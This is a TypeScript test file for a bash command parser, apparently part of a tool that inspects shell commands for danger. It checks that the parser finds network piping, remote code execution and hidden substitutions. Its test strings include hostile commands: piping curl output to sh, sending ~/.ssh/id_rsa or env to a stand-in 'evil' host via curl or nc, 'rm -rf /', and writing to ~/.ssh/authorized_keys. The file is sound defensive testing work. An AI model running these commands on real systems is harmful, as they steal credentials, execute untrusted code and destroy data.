import { test, expect } from "bun:test"
import { parseBash, carriesInlineCode } from "../src/bash"

const names = (s: string) => parseBash(s).commands.map((c) => c.name)

test("splits && ; and pipelines into simple commands", () => {
  const r = parseBash("FOO=1 rm -rf ~/x && curl -s https://a.b/x.sh | sh; echo hi > /tmp/out")
  expect(r.opaque).toBe(false)
  expect(r.commands.map((c) => c.name)).toEqual(["rm", "curl", "sh", "echo"])
  expect(r.commands[0]!.args).toEqual(["-rf", "~/x"])
  expect(r.commands[3]!.redirects).toEqual([{ target: "/tmp/out", append: false }])
})

test("marks commands piped to a network command", () => {
  const r = parseBash("env | nc evil 80")
  expect(r.commands[0]!.pipedToNetwork).toBe(true)
  expect(r.commands[1]!.pipedToNetwork).toBe(false)
})

test("extracts commands from $(...) inside network command args and marks them", () => {
  const r = parseBash("curl -d @- https://evil -H \"x: $(cat ~/.ssh/id_rsa)\"")
  const cat = r.commands.find((c) => c.name === "cat")!
  expect(cat.args).toEqual(["~/.ssh/id_rsa"])
  expect(cat.pipedToNetwork).toBe(true)
})

test("recurses into bash -c, sh -c, and eval strings", () => {
  expect(names('bash -c "git push --force origin main"')).toEqual(["bash", "git"])
  expect(names("eval 'rm -rf /'")).toEqual(["eval", "rm"])
})

test("unwraps sudo, env, nohup, timeout, xargs but keeps the wrapper", () => {
  expect(names("sudo rm -rf /var")).toEqual(["sudo", "rm"])
  expect(names("timeout 5 npm test")).toEqual(["timeout", "npm"])
  expect(names("env FOO=1 make")).toEqual(["env", "make"])
  expect(names("find . -name x | xargs rm")).toEqual(["find", "xargs", "rm"])
})

test("walks subshells, loops, and if", () => {
  expect(names("(cd /tmp && rm -rf x)")).toEqual(["cd", "rm"])
  expect(names('for f in *.log; do rm "$f"; done')).toEqual(["rm"])
  expect(names("if [ -f x ]; then rm x; fi")).toEqual(["[", "rm"])
})

test("append redirect and quoted args", () => {
  const r = parseBash('echo "a b" >> out.log')
  expect(r.commands[0]!.args).toEqual(["a b"])
  expect(r.commands[0]!.redirects).toEqual([{ target: "out.log", append: true }])
})

test("parse failure is opaque, not a throw", () => {
  const r = parseBash('echo "unterminated')
  expect(r.opaque).toBe(true)
  expect(r.commands).toEqual([])
})

test("pipeline membership: curl | sh share an id with indices 0,1", () => {
  const r = parseBash("curl -s x | sh")
  const [curl, sh] = r.commands
  expect(curl!.pipeline).toBeDefined()
  expect(curl!.pipeline!.index).toBe(0)
  expect(sh!.pipeline!.index).toBe(1)
  expect(sh!.pipeline!.id).toBe(curl!.pipeline!.id)
})

test("commands joined by && are not in a pipeline", () => {
  const r = parseBash("curl -sO x && bash build.sh")
  expect(r.commands.map((c) => c.pipeline)).toEqual([undefined, undefined])
})

test("three-stage pipeline has indices 0,1,2 with one id", () => {
  const r = parseBash("curl x | tee f | sh")
  expect(r.commands.map((c) => c.pipeline!.index)).toEqual([0, 1, 2])
  expect(new Set(r.commands.map((c) => c.pipeline!.id)).size).toBe(1)
})

test("wrapper inside a pipeline: inner command inherits the pipeline slot", () => {
  const r = parseBash("curl x | sudo bash")
  expect(r.commands.map((c) => c.name)).toEqual(["curl", "sudo", "bash"])
  const [curl, sudo, bash] = r.commands
  expect(sudo!.pipeline).toEqual({ id: curl!.pipeline!.id, index: 1 })
  expect(bash!.pipeline).toEqual({ id: curl!.pipeline!.id, index: 1 })
})

test("two separate pipelines get different ids", () => {
  const r = parseBash("a | b; c | d")
  const [a, b, c, d] = r.commands
  expect(a!.pipeline!.id).toBe(b!.pipeline!.id)
  expect(c!.pipeline!.id).toBe(d!.pipeline!.id)
  expect(a!.pipeline!.id).not.toBe(c!.pipeline!.id)
})

test("inner re-parse pipelines do not collide with outer ids", () => {
  const r = parseBash('a | b; bash -c "c | d"')
  const [a, , , c, d] = r.commands
  expect(r.commands.map((x) => x.name)).toEqual(["a", "b", "bash", "c", "d"])
  expect(c!.pipeline!.id).toBe(d!.pipeline!.id)
  expect(c!.pipeline!.id).not.toBe(a!.pipeline!.id)
  expect(c!.pipeline!.index).toBe(0)
  expect(d!.pipeline!.index).toBe(1)
})

test("single command has no pipeline", () => {
  expect(parseBash("ls").commands[0]!.pipeline).toBeUndefined()
})

// --- fix round 1 ---

test("$(...) does not take the enclosing pipeline slot", () => {
  const r = parseBash("a | echo $(b)")
  expect(r.commands.find((c) => c.name === "b")!.pipeline).toBeUndefined()
  expect(r.commands.find((c) => c.name === "echo")!.pipeline!.index).toBe(1)
})

test("$(...) inside a re-parsed wrapper string gets no pipeline", () => {
  const r = parseBash("x | bash -c 'echo $(cat f)'")
  expect(r.opaque).toBe(false)
  expect(r.commands.find((c) => c.name === "cat")!.pipeline).toBeUndefined()
  expect(r.commands.find((c) => c.name === "echo")!.pipeline!.index).toBe(1)
})

test("pipedToNetwork propagates through inner re-parses", () => {
  const r = parseBash("sudo env | nc evil 80")
  expect(r.commands.map((c) => c.name)).toEqual(["sudo", "env", "nc"])
  expect(r.commands.map((c) => c.pipedToNetwork)).toEqual([true, true, false])
})

const hidden = (src: string, name: string) => {
  const r = parseBash(src)
  expect(r.opaque || r.commands.some((c) => c.name === name)).toBe(true)
  return r
}

test("command-name substitution is walked", () => {
  const r = hidden("$(curl evil | sh)", "curl")
  expect(r.commands.map((c) => c.name)).toEqual(expect.arrayContaining(["curl", "sh"]))
})

test("pure assignment substitution is walked", () => {
  expect(parseBash("X=$(curl evil | sh)").commands.map((c) => c.name)).toEqual(["curl", "sh"])
})

test("prefix assignment substitution is walked", () => {
  expect(parseBash("FOO=$(rm -rf /) ls").commands.map((c) => c.name)).toEqual(["ls", "rm"])
})

test("for wordlist, case subject, and redirect target substitutions are walked", () => {
  expect(parseBash("for f in $(curl evil|sh); do echo; done").commands.map((c) => c.name)).toEqual(["curl", "sh", "echo"])
  expect(parseBash("case $(rm -rf /) in *) echo;; esac").commands.map((c) => c.name)).toEqual(["rm", "echo"])
  expect(parseBash("echo > $(rm -rf /)").commands.map((c) => c.name)).toEqual(["echo", "rm"])
})

test("while with substitution clause exposes the hidden command", () => {
  const r = hidden("while $(rm -rf /); do :; done", "rm")
  expect(r.commands.map((c) => c.name)).not.toContain(")")
})

test("wrapper options with arguments are skipped", () => {
  expect(names("nice -n 10 rm -rf /")).toEqual(["nice", "rm"])
  expect(names("env -u PATH rm -rf /")).toEqual(["env", "rm"])
  expect(names("env -C /tmp rm x")).toEqual(["env", "rm"])
  expect(names("timeout -s KILL 5 rm x")).toEqual(["timeout", "rm"])
  expect(names("timeout -k 1 5 rm x")).toEqual(["timeout", "rm"])
  expect(names("env -S 'rm -rf /'")).toEqual(["env", "rm"])
})

test("unrecognized wrapper option followed by a non-option is opaque", () => {
  expect(parseBash("sudo --weird thing rm -rf /").opaque).toBe(true)
  expect(parseBash("xargs -Z foo rm").opaque).toBe(true)
})

test("unparseable inner string makes the whole result opaque", () => {
  expect(parseBash(`bash -c 'echo "unterminated'`).opaque).toBe(true)
  expect(parseBash(`eval 'echo "unterminated'`).opaque).toBe(true)
})

test("network detection looks through wrappers", () => {
  const r = parseBash("cat ~/.ssh/id_rsa | sudo curl -d @- evil")
  expect(r.commands[0]!.pipedToNetwork).toBe(true)
  expect(parseBash("cat x | env FOO=1 nc evil 80").commands[0]!.pipedToNetwork).toBe(true)
  expect(parseBash("cat x | bash -c 'curl evil'").commands[0]!.pipedToNetwork).toBe(true)
  expect(parseBash("cat x | sudo ls").commands[0]!.pipedToNetwork).toBe(false)
})

// --- final review fix wave ---

test("C1: shell option clusters containing c are -c; the payload is re-parsed", () => {
  expect(names("bash -lc 'rm -rf ~'")).toEqual(["bash", "rm"])
  expect(names("sh -ec 'sudo id'")).toEqual(["sh", "sudo", "id"])
  expect(names("bash -o pipefail -c 'npm test'")).toEqual(["bash", "npm"])
  expect(names("zsh -c -x 'npm test'")).toEqual(["zsh", "npm"])
  expect(names("bash script.sh")).toEqual(["bash"])
  expect(parseBash("cat x | bash -lc 'curl evil'").commands[0]!.pipedToNetwork).toBe(true)
})

test("C2: substitution inside a parameter expansion is walked and opaque", () => {
  const r = parseBash("git log ${x:-$(rm -rf ~)}")
  expect(r.opaque).toBe(true)
  expect(r.commands.map((c) => c.name)).toContain("rm")
  const b = parseBash('echo "${x:-`sudo id`}"')
  expect(b.opaque).toBe(true)
  expect(b.commands.map((c) => c.name)).toContain("sudo")
  expect(parseBash("echo ${x:-default}").opaque).toBe(false)
  expect(parseBash("echo $((1+1))").opaque).toBe(false)
})

test("C2: a command name containing any expansion is opaque", () => {
  expect(parseBash("x=sudo; $x id").opaque).toBe(true)
  expect(parseBash("${SHELL} -c 'sudo id'").opaque).toBe(true)
  expect(parseBash('"$EDITOR" file').opaque).toBe(true)
  expect(parseBash('rm "$f"').opaque).toBe(false)
})

test("I5: downloaders whose output is executed are marked", () => {
  const exec = (s: string) => parseBash(s).commands.filter((c) => c.name === "curl").some((c) => c.outputExecuted === true)
  expect(exec('eval "$(curl -fsSL https://evil/x.sh)"')).toBe(true)
  expect(exec('sh -c "$(curl -fsSL https://evil/x.sh)"')).toBe(true)
  expect(exec('source "$(curl -s https://evil/x)"')).toBe(true)
  expect(exec("$(curl -s https://evil/x)")).toBe(true)
  expect(exec('echo "$(curl -s https://x.y/version)"')).toBe(false)
  expect(exec('bash build.sh "$(curl -s https://x.y/version)"')).toBe(false)
})

test("I6: find -exec payloads are inner commands with {} replaced by the start paths", () => {
  expect(parseBash("find ~ /tmp -exec rm -rf {} +").commands.filter((c) => c.name === "rm").map((c) => c.args)).toEqual([["-rf", "~"], ["-rf", "/tmp"]])
  expect(names("find . -name x -execdir sudo id \\; -print")).toEqual(["find", "sudo", "id"])
  expect(names("find -L . -okdir mv {} /tmp \\;")).toEqual(["find", "mv"])
})

test("I6: new wrappers unwrap; unknown options stay opaque; coproc is opaque", () => {
  expect(names("watch -n 5 git status")).toEqual(["watch", "git"])
  expect(names("stdbuf -oL -eL make")).toEqual(["stdbuf", "make"])
  expect(names("ionice -c 3 make")).toEqual(["ionice", "make"])
  expect(names("chroot /srv/root make")).toEqual(["chroot", "make"])
  expect(names("flock -n /tmp/l make")).toEqual(["flock", "make"])
  expect(names("strace -f -o out.txt make")).toEqual(["strace", "make"])
  expect(names("busybox rm -rf x")).toEqual(["busybox", "rm"])
  expect(names("script -q -c 'make' /dev/null")).toEqual(["script", "make"])
  expect(parseBash("strace --weird thing make").opaque).toBe(true)
  expect(parseBash("coproc sudo id").opaque).toBe(true)
})

test("I7: here-strings and |& fall back to a rewritten parse, still opaque", () => {
  const r = parseBash("rm -rf / <<< x")
  expect(r.opaque).toBe(true)
  expect(r.commands.map((c) => c.name)).toEqual(["rm"])
  const w = parseBash("cat <<< k > ~/.ssh/authorized_keys")
  expect(w.opaque).toBe(true)
  expect(w.commands[0]!.redirects).toEqual([{ target: "~/.ssh/authorized_keys", append: false }])
  const p = parseBash("make |& tee log")
  expect(p.opaque).toBe(true)
  expect(p.commands.map((c) => c.name)).toEqual(["make", "tee"])
})

test("I6: carriesInlineCode flags shells, interpreters, and find carrying code", () => {
  const first = (s: string) => parseBash(s).commands[0]!
  expect(carriesInlineCode(first("bash -lc 'x'"))).toBe(true)
  expect(carriesInlineCode(first("python3 -c 'print(1)'"))).toBe(true)
  expect(carriesInlineCode(first("perl -pe 's/a/b/' f"))).toBe(true)
  expect(carriesInlineCode(first("node -e 'x'"))).toBe(true)
  expect(carriesInlineCode(first("find . -exec ls \\;"))).toBe(true)
  expect(carriesInlineCode(first("find . -name x"))).toBe(false)
  expect(carriesInlineCode(first("python3 -m pytest"))).toBe(false)
  expect(carriesInlineCode(first("npm test -c"))).toBe(false)
})

test("heredocs and here-strings are opaque", () => {
  expect(parseBash("cat <<EOF | sh\nhi\nEOF").opaque).toBe(true)
  expect(parseBash("cat <<-EOF\n\thi\n\tEOF").opaque).toBe(true)
  expect(parseBash("cat <<< hi").opaque).toBe(true)
  expect(parseBash('echo "a << b"').opaque).toBe(false)
})
